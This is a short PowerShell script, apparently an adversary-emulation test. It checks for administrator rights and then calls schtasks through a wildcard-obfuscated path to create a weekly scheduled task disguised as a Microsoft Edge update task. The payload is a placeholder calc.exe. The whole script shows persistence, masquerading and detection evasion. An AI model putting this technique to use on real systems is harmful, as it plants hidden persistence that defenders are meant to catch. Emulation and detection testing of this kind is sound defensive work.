if ( [Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544') {
    Invoke-Expression -Command "$env:???t??r???\*2\??h???k?* /create /sc weekly /tn MicrosoftEdgeUpdateTaskMachine_System /tr %systemroot%\System32\calc.exe"
} else {
    Invoke-Expression -Command "$env:???t??r???\*2\??h???k?* /create /sc weekly /tn MicrosoftEdgeUpdateTaskMachine_User /tr %systemroot%\System32\calc.exe"
}